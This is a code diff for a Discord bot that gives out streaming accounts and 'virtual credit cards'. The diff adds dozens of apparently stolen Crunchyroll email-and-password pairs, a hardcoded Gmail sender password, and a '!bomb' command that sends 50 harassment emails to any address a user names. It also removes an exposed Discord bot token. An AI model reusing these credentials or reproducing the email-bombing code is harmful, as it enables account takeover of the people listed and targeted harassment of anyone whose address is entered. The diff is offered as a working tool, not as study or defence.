@@ -1,14 +1,20 @@
 import nextcord
-from nextcord.ext import commands
 import random
+import smtplib
 import os
-
-DISCORD_TOKEN = 'MTI5OTQwMTk2ODU3MzM1NDA3Nw.GCm-nd.XTJUf-UMkJyrx1vmwpeFPaTVZpAF0wNNAPZUN8'
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from nextcord.ext import commands
 
 intents = nextcord.Intents.default()
 intents.message_content = True
 discord_bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
+smtp_server = "smtp.gmail.com"
+smtp_port = 587
+sender_email = "you.are.a.loser.ha.ha.ha.ha.ha@gmail.com"
+sender_password = "gvtx sadh yumx jylq"
+server = smtplib.SMTP(smtp_server, smtp_port)
 img = "https://cdn.discordapp.com/attachments/1337159372190777406/1337514039445557369/1000109936-removebg-preview.png?ex=67a7b884&is=67a66704&hm=b0ec08fbaf4c6c2f788070b54e2c6240ab262113b9cdf79a3c5b8a655b7094c0&"
 amazon = "https://www.primevideo.com/region/eu/offers/ref=atv_dp_atf_tv_signup_3p_bb_t1IAAAAAAA0wg0?force_return_url=1&return_url=%2Fregion%2Feu%2Fdetail%2F0TECOCN1ZHH3W56S1J6SXHQ0UQ%2Fref%3Datv_dp_sign_suc_3P&benefitId=maxes&skipMarketingPage=1"
 
@@ -43,6 +49,8 @@ def get_channel_tier(channel_id):
         return "basic"
     elif channel_id == 1337161100625576067:
         return "super"
+    elif channel_id == 1345367950324142112:
+        return "bomber"
     return "scam"
 
 embed404 = nextcord.Embed(
@@ -156,6 +164,51 @@ disney = {
 }
 
 crunchyroll = {
+    "dominationyt009@gmail.com": "Finn0513!",
+    "agustin2019543@gmail.com": "hammith123",
+    "jalylweaver@gail.com": "Gameboy65",
+    "lu.tadashi@hotmail.com": "lu949494",
+    "dragonscaler28@gmail.com": "jose0328",
+    "pinte2629@wrdsb.ca": "pars4567",
+    "jairoaguerraa@gmail.com": "jairo12345",
+    "cynedlin@gmail.com": "15009344-9",
+    "kevinho1873@gmail.com": "Silasiscute17.",
+    "mrlindo154@gmail.com": "ja22de23",
+    "xalajar454@barakal.com": "@Novaterra23",
+    "brant.bernardo@gmail.com": "be252525",
+    "danielsito1177@gmail.com": "Shinpei17",
+    "ydlopez@uc.cl": "Eqcwg646",
+    "billybawkin0@gmail.com": "Cadence1",
+    "lokosmurf1@gmail.com": "Fazenda12",
+    "rwfiocco@ig.com.br": "nick0801",
+    "mengenjas@web.de": "Yokohama21",
+    "r306gz9xb7k6@mrcliff.mozmail.com": "rtazbcqenq21123",
+    "artursentose203@gmail.com": "artur2711#",
+    "apricottrina@mitico.org": "Fuxiontv2024",
+    "callstoremob111@gmail.com": "Call1111",
+    "09thalyprice@gmail.com": "Cherries202",
+    "nicolasceliz50@outlook.com": "Slenderyjeffamor10!",
+    "derdymon@gmail.com": "vogjy4-jafbYp-fuwdyj",
+    "almatrafikha@gmail.com": "Nasjiji69",
+    "Bigspamscam@proton.me": "ihateSenpai082008",
+    "martin12jpr@gmail.com": "peke2809",
+    "lgutteriez@icloud.com": "Kevin208Cm@",
+    "keshavjoshi54321@gmail.com": "keshav98119",
+    "kevin.atc16@gmail.com": "qz1qg45z1#",
+    "Shaqgovr@gmail.com": "Football32$",
+    "dowdjayden44@gmail.com": "Jayden2009!",
+    "carllosh302@gmail.com": "99441824kaka",
+    "matmatdu77@hotmail.fr": "matmatdu77",
+    "Novacrunchyroll02@gifthaventt.com": "aaddssccxx",
+    "Anthonygalbreath2797@gmail.com": "Pango2797",
+    "stglueck@gmx.at": "Chris1412steff!",
+    "pauloplantoesfull@gmail.com": "paulinxaulin98",
+    "poneycream243@gmail.com": "killerfrog243@",
+    "marctirse21@gmail.com": "Sxmplymarc21!",
+    "joao.hals@hotmail.com": "senhaanimes",
+    "smhio86@gmail.com": "26637894",
+    "smgreif@t-online.de": "Kurczaczek07",
+    "tequedas209v@tudealer.net": "tudealer5141",
     "ar1526114@gmail.com": "0800hijodelanoche",
     "rtorres066@hotmail.com": "2369644@Rtvx2",
     "brenotlou.lb@gmail.com": "Feluca2010!",
@@ -685,8 +738,8 @@ async def gen(ctx, platform: str):
         await ctx.send(embed=embed4)
     except nextcord.Forbidden:
         embed3 = nextcord.Embed(
-            title="Error",
-            description="**❌  I can't send you a DM. Please check your DM settings.**",
+            title="❌  Error",
+            description="**I can't send you a DM. Please check your DM settings.**",
             color=0x141318
         )
         await ctx.send(embed=embed3)
@@ -727,15 +780,42 @@ async def stock(ctx):
             "**VCCs:**\n"
             f"{vccs}"
         ),
-        color=0x141318
-        )
-        embed.set_thumbnail(url=img)
+        color=0x141318)
         embed.set_thumbnail(url=img)
         await ctx.send(embed=embed)
         return
     embed.set_thumbnail(url=img)
-    embed.set_thumbnail(url=img)
     await ctx.send(embed=embed)
+
+@discord_bot.command(name="bomb")
+async def bomb(ctx, email: str):
+    if email == "medic.ahmed2227@gmail.com" and ctx.author != ctx.guild.owner:
+        ctx.author.send("Well, well, well..tried bombing me? 💀")
+        ctx.author.kick()
+        channel = ctx.guild.get_channel(1261249723956723813)
+        channel.send(f"## {ctx.author.name} got kicked!\n### P.S. Don't try bombing the owner :)")
+    tier = get_channel_tier(ctx.channel.id)
+    if tier != "bomber":
+        return
+
+    embed699 = nextcord.Embed(
+        title="💣  Bombing the email",
+        description="**Please allow up to 5 minutes for the emails to arrive.**",
+        color=0x141318)
+    embed699.set_thumbnail(url=img)
+    await ctx.send(embed=embed699)
+    
+    server.starttls()
+    server.login(sender_email, sender_password)
+    
+    for i in range(50):
+        msg = MIMEMultipart()
+        msg["From"] = sender_email
+        msg["To"] = email
+        msg["Subject"] = f"You just got bombed. {i+1}"
+        msg.attach(MIMEText("You just got bombed anonymously.", "plain"))
+        server.sendmail(sender_email, email, msg.as_string())
+        i += 1
 
 @discord_bot.command(name="help")
 async def help_command(ctx):
@@ -744,9 +824,12 @@ async def help_command(ctx):
     embed = nextcord.Embed(
         title="❔  Available Commands",
         color=0x141318)
-    embed.add_field(name="!genvcc <platform>", value="Generate a virtual credit card for the specified platform.", inline=False)
-    embed.add_field(name="!genacc <platform>", value="Generate an account for the specified platform.", inline=False)
-    embed.add_field(name="!stock", value="Check the available platforms.", inline=False)
+    if "bomber" in get_channel_tier(ctx.channel.id):
+        embed.add_field(name="!bomb name@email.com", value="Bomb the specified email 50 times.", inline=False)
+    else:
+        embed.add_field(name="!genvcc <platform>", value="Generate a virtual credit card.", inline=False)
+        embed.add_field(name="!genacc <platform>", value="Generate an account.", inline=False)
+        embed.add_field(name="!stock", value="Check the available platforms.", inline=False)
 
     embed.set_thumbnail(url=img)
     await ctx.send(embed=embed)
